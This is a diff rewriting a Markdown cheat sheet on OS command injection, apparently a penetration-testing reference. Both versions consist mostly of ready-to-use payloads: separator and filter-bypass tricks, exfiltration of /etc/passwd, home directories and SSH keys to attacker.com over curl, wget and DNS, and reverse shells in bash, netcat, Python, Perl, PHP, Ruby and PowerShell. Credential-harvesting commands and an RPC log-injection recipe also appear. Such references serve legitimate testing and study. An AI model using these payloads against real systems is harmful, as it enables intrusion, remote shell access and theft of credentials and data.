@@ -1,721 +1,199 @@
-# OS Command Injection - Quick Reference Cheat Sheet
+# OS Command Injection — Cheat Sheet
 
-## Command Separators
+Comprehensive payload reference. Quick reference / detection workflow in `os-command-injection-quickstart.md`.
 
-### Unix/Linux
+## Command separators
 
-```bash
-# Basic separators
-;          # Sequential execution
-|          # Pipe output to next command
-||         # Execute if previous fails (OR)
-&&         # Execute if previous succeeds (AND)
-&          # Background execution
-%0a        # Newline (URL encoded)
-\n         # Newline
+**Unix/Linux:**
 
-# Command substitution
-`cmd`      # Backtick substitution
-$(cmd)     # Dollar-parenthesis substitution
+| Separator | Meaning |
+|---|---|
+| `;` | Sequential execution |
+| `&&` | Run B if A succeeds |
+| `\|\|` | Run B if A fails |
+| `\|` | Pipe stdout |
+| `&` | Run in background |
+| `` ` ` `` | Backtick command substitution |
+| `$()` | Modern command substitution |
+| `${IFS}` | Field separator (space replacement) |
+| `\n` (`%0a`) | Newline |
+| `\r\n` (`%0d%0a`) | CRLF |
 
-# Advanced
-%0d%0a     # CRLF (URL encoded)
-%0d        # Carriage return
-%09        # Tab
+**Windows:**
+
+| Separator | Meaning |
+|---|---|
+| `&` | Sequential |
+| `&&` | Run B if A succeeds |
+| `\|\|` | Run B if A fails |
+| `\|` | Pipe |
+| `%CD%` | Current directory |
+| `%TEMP%` | Temp directory |
+
+## Detection payloads
+
+**Time-based (universal):**
 ```
-
-### Windows
-
-```cmd
-# Command Prompt
-&          # Sequential execution
-|          # Pipe output
-||         # Execute if previous fails
-&&         # Execute if previous succeeds
-
-# PowerShell (also supports semicolon)
-;          # Sequential execution
-```
-
-## Quick Test Payloads
-
-### Time-Based (Blind Detection)
-
-```bash
-# Linux/Unix
-||sleep 5||
-;sleep 5;
-|sleep 5|
+;sleep 5
+&& sleep 5
+| sleep 5
 `sleep 5`
 $(sleep 5)
-||ping -c 5 127.0.0.1||
-||timeout 5||
-
-# Windows
-||timeout /t 5||
-||ping -n 6 127.0.0.1||
-& timeout /t 5 &
-& ping -n 6 127.0.0.1 &
+%0Asleep 5
+%0D%0Asleep 5
+&timeout /t 5     (Windows)
 ```
 
-### Output-Based (Direct Injection)
-
-```bash
-# Unix/Linux
-|whoami
+**Output-based:**
+```
+;id
 ;whoami
-||whoami||
-&&whoami&&
-`whoami`
-$(whoami)
-%0awhoami%0a
-
-# Get more info
-|id
-|uname -a
-|hostname
-|pwd
-|cat /etc/passwd
+;uname -a
+;cat /etc/passwd
+&dir            (Windows)
+&type C:\Windows\win.ini
+;hostname
 ```
 
-### Out-of-Band (DNS/HTTP)
+**Out-of-band:**
+```
+;curl http://attacker.com/$(whoami)
+;nslookup $(whoami).attacker.com
+;wget http://attacker.com/$(id)
+$(curl http://attacker.com/$(whoami))
+&powershell -c "Invoke-WebRequest http://attacker.com/$env:USERNAME"
+```
+
+## Bypass techniques
 
 ```bash
-# DNS exfiltration
-||nslookup attacker.com||
-||dig attacker.com||
-||host attacker.com||
+# Space filter
+{cat,/etc/passwd}                cat$IFS/etc/passwd        cat${IFS}/etc/passwd
+cat<>/etc/passwd                  cat$IFS$9/etc/passwd
 
-# DNS with data
-||nslookup `whoami`.attacker.com||
-||nslookup $(whoami).attacker.com||
+# JSON-tab → literal tab byte (IFS bypass for `value.includes(' ')` filters)
+# When the backend filter is `if user_input.includes(' ') reject;` and the input
+# arrives via JSON, the JSON string "foo\tbar" decodes to foo<TAB>bar — passes
+# the 0x20 check, but the shell splits on tab (default IFS = space|tab|newline).
+# Payload: {"interface": "eth0;cat\t/flag*.txt>\t/some/writable/path"}
+# Use `;` instead of `&&` when the leading command may fail (binary missing on
+# Alpine/busybox); `;` runs the second regardless. More reliable than ${IFS},
+# which doesn't always expand inside the exec'd shell (depends on bash/dash/ash).
 
-# HTTP exfiltration
-||curl http://attacker.com||
-||wget http://attacker.com||
-||curl http://attacker.com/$(whoami)||
+# escapeshellcmd bypass via double-shell-eval (PHP)
+# Vulnerable: passthru("ping " . escapeshellcmd($_GET['ip']))
+# Payload:    1.1.1.1';bash -c 'id
 
-# Burp Collaborator
-||nslookup burpcollaborator.net||
-||nslookup `whoami`.burpcollaborator.net||
+# Slash filter
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
+${HOME%${HOME#?}}etc${HOME%${HOME#?}}passwd
+
+# Keyword filter
+ca''t /etc/passwd          c\at /etc/passwd        ta'c' /etc/passwd
+nl /etc/passwd             head -100 /etc/passwd
+
+# Separator filter (use newlines, &&, ||)
+%0Aid    $'\nid'    &&id    ||id    %0a%0did
 ```
 
-## Bypass Techniques
-
-### Space Filtering
+## Data exfiltration
 
 ```bash
-# Using IFS (Internal Field Separator)
-cat${IFS}/etc/passwd
-cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+# File read
+;cat /etc/passwd
+;ls -la /; find / -name "*.conf" 2>/dev/null; find / -perm -4000 2>/dev/null
 
-# Using tabs
-cat%09/etc/passwd
+# DNS exfil
+;nslookup $(whoami).attacker.com
+;dig +short $(id | base64 | tr -d '+').attacker.com
 
-# Brace expansion
-{cat,/etc/passwd}
-
-# Using redirect
-cat</etc/passwd
-
-# Using $IFS with parameters
-cat$IFS/etc/passwd
-cat$IFS$9/etc/passwd
+# HTTP exfil
+;cat /etc/passwd | curl -X POST --data-binary @- http://attacker.com/
+;tar czf - /home | curl -X POST --data-binary @- http://attacker.com/
+;curl -F "file=@/etc/passwd" http://attacker.com/upload
 ```
 
-### Slash Filtering
+## Reverse shells
 
 ```bash
-# Using environment variables
-cat${PATH:0:1}etc${PATH:0:1}passwd
-cat${HOME:0:1}etc${HOME:0:1}passwd
+# Bash
+;bash -i >& /dev/tcp/attacker/4444 0>&1
+;0<&196;exec 196<>/dev/tcp/attacker/4444; sh <&196 >&196 2>&196
 
-# Creating variable
-SLASH=/
-cat $SLASH etc $SLASH passwd
+# Netcat (-e or named pipe fallback)
+;nc -e /bin/bash attacker 4444
+;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f
 
-# Using printf
-cat $(printf '\x2f')etc$(printf '\x2f')passwd
+# Python
+;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'
+
+# Perl / PHP / Ruby — see PayloadsAllTheThings/Reverse Shell Cheatsheet for one-liners
+# PowerShell — see PayloadsAllTheThings (long one-liner)
 ```
 
-### Keyword Filtering
+## Enumeration / vulnerable params
 
 ```bash
-# Using wildcards
-/bin/c?t /etc/passwd
-/bin/wh*ami
-/usr/bin/n?t?at
-
-# Using quotes
-c""at /etc/passwd
-c''at /etc/passwd
-c\at /etc/passwd
-
-# Using variables
-a=wh;b=oami;$a$b
-CMD=cat;$CMD /etc/passwd
-
-# Using backslashes
-wh\oa\mi
-c\a\t /etc/passwd
-
-# Base64 encoding
-echo d2hvYW1p|base64 -d|bash
-echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash
-
-# Character insertion
-w$@h$@o$@a$@m$@i
-c""a""t /etc/passwd
+# System / Network / FS / Users / Processes / Creds
+;id; pwd; uname -a; hostname; cat /etc/issue
+;ip a; netstat -tulnp; cat /etc/resolv.conf
+;ls -la / /home /tmp; find / -writable 2>/dev/null; find / -perm -4000 2>/dev/null
+;cat /etc/passwd /etc/group; w; who; last
+;ps -ef; top -n 1
+;grep -ri 'password' /home 2>/dev/null; cat ~/.ssh/id_rsa; cat ~/.bash_history
+;find / -name '*.kdbx' 2>/dev/null
 ```
 
-### Semicolon/Pipe Filtering
-
-```bash
-# Using newlines
-%0awhoami%0a
-%0dwhoami%0d
-%0d%0awhoami%0d%0a
-
-# Using brace expansion
-{cat,/etc/passwd}
-
-# Using variable expansion
-${IFS}cat${IFS}/etc/passwd
-```
-
-## Data Exfiltration
-
-### File Reading
-
-```bash
-# Direct output (if not blind)
-|cat /etc/passwd
-;cat /etc/shadow
-||cat ~/.ssh/id_rsa||
-
-# Output redirection
-||whoami>/var/www/html/out.txt||
-||cat /etc/passwd>/tmp/data.txt||
-||id>>/var/www/images/out.txt||
-
-# Error redirection
-||ls /root 2>/var/www/html/err.txt||
-
-# Combined stdout and stderr
-||cat /etc/shadow &>/var/www/html/shadow.txt||
-```
-
-### DNS Exfiltration
-
-```bash
-# Basic data
-||nslookup `whoami`.attacker.com||
-||nslookup $(hostname).attacker.com||
-
-# File content (small)
-||nslookup `cat /etc/hostname`.attacker.com||
-
-# Base64 encoded
-||nslookup `cat /etc/passwd|base64|head -1`.attacker.com||
-
-# Character substitution
-||nslookup `whoami|tr ':' '-'`.attacker.com||
-```
-
-### HTTP Exfiltration
-
-```bash
-# GET with path
-||curl http://attacker.com/`whoami`||
-
-# GET with parameter
-||curl "http://attacker.com/?data=`whoami`"||
-
-# POST with data
-||curl -X POST -d "`cat /etc/passwd`" http://attacker.com||
-
-# Base64 in POST
-||curl -X POST -d "`cat /etc/passwd|base64`" http://attacker.com||
-
-# Using wget
-||wget --post-data="`whoami`" http://attacker.com||
-```
-
-## Reverse Shells
-
-### Bash
-
-```bash
-# Standard reverse shell
-||bash -i >& /dev/tcp/ATTACKER/4444 0>&1||
-
-# Alternative
-||bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'||
-
-# Encoded
-||echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=|base64 -d|bash||
-```
-
-### Netcat
-
-```bash
-# With -e flag
-||nc ATTACKER 4444 -e /bin/bash||
-
-# Without -e flag (FIFO)
-||rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f||
-
-# OpenBSD netcat
-||rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER 4444 >/tmp/f||
-```
-
-### Python
-
-```bash
-# Python 2
-||python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'||
-
-# Python 3
-||python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'||
-```
-
-### Perl
-
-```bash
-||perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'||
-```
-
-### PHP
-
-```bash
-||php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'||
-```
-
-### Ruby
-
-```bash
-||ruby -rsocket -e'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'||
-```
-
-### PowerShell (Windows)
-
-```powershell
-||powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"||
-```
-
-## Enumeration Commands
-
-### System Information
-
-```bash
-# Basic info
-whoami              # Current user
-id                  # User ID and groups
-hostname            # System hostname
-uname -a            # System information
-cat /etc/issue      # OS version
-cat /etc/*-release  # OS release info
-cat /proc/version   # Kernel version
-
-# Windows
-whoami
-whoami /all
-hostname
-systeminfo
-ver
-```
-
-### Network Information
-
-```bash
-# Linux
-ifconfig            # Network interfaces
-ip addr             # IP addresses
-ip route            # Routing table
-netstat -tulpn      # Listening ports
-ss -tulpn           # Socket statistics
-arp -a              # ARP table
-cat /etc/hosts      # Hosts file
-cat /etc/resolv.conf # DNS configuration
-
-# Windows
-ipconfig
-ipconfig /all
-netstat -ano
-route print
-arp -a
-```
-
-### File System
-
-```bash
-# Linux
-pwd                 # Current directory
-ls -la              # List files
-find / -type f -name "*.conf" 2>/dev/null  # Find config files
-find / -perm -4000 2>/dev/null             # Find SUID files
-find / -writable -type d 2>/dev/null       # Writable directories
-
-# Windows
-cd
-dir
-dir /s /b *.config
-```
-
-### Users and Groups
-
-```bash
-# Linux
-cat /etc/passwd     # User accounts
-cat /etc/group      # Groups
-cat /etc/shadow     # Password hashes (requires root)
-w                   # Logged in users
-last                # Login history
-
-# Windows
-net user
-net localgroup administrators
-net user /domain
-```
-
-### Processes
-
-```bash
-# Linux
-ps aux              # All processes
-ps -ef              # Process tree
-top                 # Interactive process viewer
-pstree              # Process tree
-
-# Windows
-tasklist
-tasklist /svc
-wmic process list full
-```
-
-### Credentials and Secrets
-
-```bash
-# Linux
-cat ~/.bash_history    # Command history
-cat ~/.ssh/id_rsa      # SSH private key
-cat ~/.ssh/authorized_keys  # SSH authorized keys
-env                    # Environment variables
-cat /var/www/html/config.php  # Web app config
-grep -r "password" /var/www/  # Search for passwords
-
-# Windows
-cmdkey /list
-type C:\Windows\Panther\Unattend.xml
-reg query HKLM /f password /t REG_SZ /s
-```
-
-## Common Vulnerable Parameters
-
-```
-# URL Parameters
-?id=
-?page=
-?file=
-?path=
-?search=
-?query=
-?cmd=
-?exec=
-?command=
-?ping=
-?ip=
-?host=
-
-# POST Parameters
-filename=
-email=
-name=
-address=
-message=
-comment=
-backup=
-template=
-
-# HTTP Headers
-User-Agent:
-X-Forwarded-For:
-X-Real-IP:
-Referer:
-X-Custom-Header:
-
-# Hidden Injection Surfaces (secondary processing)
-# Markdown/rich-text fields that fetch external resources (image URLs → shell exec)
-# File conversion endpoints (PDF generators, image processors shelling to convert/ffmpeg)
-# Webhook/callback URL fields (server fetches URL via curl/wget subprocess)
-# Template rendering with server-side resource inclusion
-# Export/report generators that invoke CLI tools
-# DNS/network diagnostic tools (ping, traceroute, nslookup wrappers)
-```
-
-## Detection Methodology
-
-### Manual Testing Workflow
-
-1. **Identify injection points** - All user-controlled input
-2. **Test time-based detection** - `||sleep 5||`
-3. **Test output-based** - `|whoami`
-4. **Test out-of-band** - DNS/HTTP callbacks
-5. **Confirm with multiple payloads**
-6. **Document findings**
-
-### Burp Suite Workflow
-
-1. **Proxy** → Intercept request
-2. **Send to Repeater** → Test payloads
-3. **Collaborator** → Out-of-band testing
-4. **Intruder** → Automated payload testing
-5. **Scanner** → Active scan for vulnerabilities
+Common vulnerable params: `ip`, `host`, `ping`, `cmd`, `domain`, `url`, `file`, `path`, `action`, `download`, `print`, `run`, `execute`, `command`, `package`, `lookup`, `check`, `scan`, `nslookup`.
+
+## Burp Suite workflow
+
+1. Spray separators on every input (`;`, `&&`, `|`, `` ` ``, `$()`).
+2. Watch for: response time delay, stderr leak, "ping: ..." in response.
+3. Once confirmed, extract via `;id` / `;cat /etc/passwd`.
+4. For blind: set up Burp Collaborator, use `;curl http://collab/` payload.
+
+## Library-specific patterns
+
+| Sink | Language | Pattern |
+|---|---|---|
+| `system()` `exec()` `shell_exec()` `passthru()` | PHP | concat into shell |
+| `os.system()` `subprocess.call(shell=True)` | Python | string-concat |
+| `subprocess.Popen(..., shell=True)` | Python | shell=True is the bug |
+| `child_process.exec()` | Node.js | string-concat |
+| `child_process.spawn(..., {shell:true})` | Node.js | shell:true is the bug |
+| `Runtime.exec(String)` | Java | string variant |
+| `ProcessBuilder` | Java | string-concat in command list |
+| `popen()` | C | `system(3)` family |
 
 ## Tools
 
-### Commix
-
 ```bash
-# Basic usage
-commix --url="http://target.com/page?id=1"
+# Commix
+commix --url='http://target/?id=1*' --batch
+commix --url='http://target/?id=1' -p 'id' --batch
 
-# POST parameters
-commix --url="http://target.com/submit" --data="email=test" -p email
-
-# Cookie testing
-commix --url="http://target.com/page" --cookie="sessionid=abc123"
-
-# Execute command
-commix --url="http://target.com/page?id=1" --os-cmd="whoami"
-
-# Interactive shell
-commix --url="http://target.com/page?id=1" --os-shell
-
-# File operations
-commix --url="http://target.com/page?id=1" --file-read="/etc/passwd"
-
-# With proxy
-commix --url="http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"
+# Custom Python
+import requests, time
+for sep in [';','&&','|','`','$()','%0A']:
+    p = sep + 'sleep 5'
+    start = time.time()
+    requests.get('http://target/?id=' + p, timeout=10)
+    if time.time() - start > 4.5:
+        print(f'[+] Working: {sep}')
 ```
 
-### cURL Testing
+## RPC parser → `sh -c` injection (Thrift / gRPC / RabbitMQ-RPC)
 
-```bash
-# GET request
-curl "http://target.com/page?id=1||whoami||"
+Recurring shape on internal RPC services that read an attacker-writable file, regex-extract a field per line, then plug the field into `os.system(f"echo '... {field} ...' >> log")`. Inject shell metachars (`'; <CMD>; #`, with `\047` = `'` in echo-friendly form) into the regex-captured field. Write the malicious log line, trigger the RPC method (e.g., Thrift `ReadLogFile(path)`), shell runs as the RPC's UID. Use `;` not `&&` — the leading echo often fails. Common in Java/Python RPC services that shell out for log rotation/formatting. Detection heuristic: any RPC method taking a "file path" argument AND running commands derived from file content.
 
-# POST request
-curl -X POST "http://target.com/submit" -d "email=test||whoami||"
+## Python `eval()` via format-string interpolation
 
-# Time measurement
-time curl -X POST "http://target.com/submit" -d "email=test||sleep 5||"
+When server-side Python does `eval('%s > 1' % user_input)` (or similar f-string / `.format()` patterns), the user data flows in as Python source. `__import__("os").system(...)` is a single expression and runs unconditionally — no AST sandbox to escape. Full pattern + blind exfil channels: [scenarios/code-injection/python-eval-format-string.md](scenarios/code-injection/python-eval-format-string.md).
 
-# With cookies
-curl "http://target.com/page" -b "sessionid=abc123" -d "param=test||whoami||"
+## References
 
-# Custom headers
-curl "http://target.com/page" -H "X-Forwarded-For: 127.0.0.1||whoami||"
-```
-
-## Prevention Checklist
-
-- [ ] **Avoid OS commands** - Use native APIs instead
-- [ ] **Parameterized execution** - Never concatenate user input with commands
-- [ ] **Input validation** - Allowlist only safe characters
-- [ ] **Command allowlist** - Only permit specific pre-defined commands
-- [ ] **Principle of least privilege** - Run with minimal permissions
-- [ ] **WAF deployment** - Block malicious patterns
-- [ ] **Security logging** - Monitor for suspicious input
-- [ ] **Code review** - Search for dangerous functions
-- [ ] **Security testing** - Include in SAST/DAST
-- [ ] **Keep updated** - Patch known vulnerabilities
-
-## Dangerous Functions by Language
-
-### PHP
-```php
-system()
-exec()
-shell_exec()
-passthru()
-popen()
-proc_open()
-backticks (``)
-eval()
-assert()
-```
-
-### Python
-```python
-os.system()
-os.popen()
-subprocess.call(shell=True)
-subprocess.Popen(shell=True)
-eval()
-exec()
-execfile()
-```
-
-### Java
-```java
-Runtime.exec()
-ProcessBuilder.start()
-```
-
-### Node.js
-```javascript
-child_process.exec()
-child_process.spawn()
-child_process.execFile()
-child_process.fork()
-eval()
-```
-
-### Ruby
-```ruby
-system()
-exec()
-`backticks`
-%x{command}
-IO.popen()
-Kernel.open("|command")
-```
-
-### Perl
-```perl
-system()
-exec()
-`backticks`
-open("|command")
-```
-
-## Encoding Reference
-
-### URL Encoding
-
-```
-Space     = %20 or +
-;         = %3b
-|         = %7c
-&         = %26
-$         = %24
->         = %3e
-<         = %3c
-`         = %60
-\         = %5c
-!         = %21
-(         = %28
-)         = %29
-Newline   = %0a
-Tab       = %09
-CRLF      = %0d%0a
-```
-
-### Base64 Encoding
-
-```bash
-# Encode
-echo "whoami" | base64
-# Output: d2hvYW1pCg==
-
-# Decode and execute
-echo d2hvYW1pCg==|base64 -d|bash
-
-# Common commands (base64)
-whoami        = d2hvYW1p
-cat /etc/passwd = Y2F0IC9ldGMvcGFzc3dk
-id            = aWQ=
-uname -a      = dW5hbWUgLWE=
-```
-
-### Hex Encoding
-
-```bash
-# Using echo -e
-echo -e "\x77\x68\x6f\x61\x6d\x69"  # whoami
-
-# Using printf
-printf "\x77\x68\x6f\x61\x6d\x69"   # whoami
-```
-
-## Environment Variables
-
-### Useful for Bypass
-
-```bash
-# Internal Field Separator
-${IFS}              # Space character
-$IFS$9              # Space with empty variable
-
-# PATH manipulation
-${PATH:0:1}         # First character of PATH (/)
-${HOME:0:1}         # First character of HOME (/)
-
-# Empty variables
-${RANDOM:0:0}       # Empty string
-$9                  # Empty positional parameter
-
-# Common variables
-$USER               # Current user
-$HOME               # Home directory
-$PWD                # Current directory
-$HOSTNAME           # Hostname
-```
-
-## WAF Bypass Techniques
-
-```bash
-# Case variation (Windows)
-WhOaMi
-CAT C:\file.txt
-
-# Character insertion
-w$@h$@o$@a$@m$@i
-c""a""t /etc/passwd
-
-# Wildcard usage
-/???/c?t /???/p??s??
-/bin/n?*at
-
-# Encoding
-%77%68%6f%61%6d%69  # URL encoded whoami
-
-# Concatenation
-a=who;b=ami;$a$b
-who$()ami
-
-# Newlines instead of spaces
-cat%0a/etc/passwd
-
-# Tabs instead of spaces
-cat%09/etc/passwd
-
-# Using less common separators
-cat</etc/passwd
-```
-
-## Testing Priority
-
-1. **Time-based blind** (most reliable)
-   - `||sleep 5||`
-
-2. **Output-based** (fastest confirmation)
-   - `|whoami`
-
-3. **Out-of-band** (bypasses output filtering)
-   - `||nslookup attacker.com||`
-
-4. **File-based** (for persistent access)
-   - `||whoami>/var/www/html/out.txt||`
-
-## Quick Reference URLs
-
-- **OWASP Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
-- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
-- **Commix GitHub**: https://github.com/commixproject/commix
-- **HackTricks**: https://book.hacktricks.xyz/pentesting-web/command-injection
-
----
-
-*Quick reference for OS command injection testing and exploitation*
+- `os-command-injection-quickstart.md` — fast detection workflow.
+- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
+- CWE-78 (OS Command Injection).
+- PayloadsAllTheThings/Command Injection.
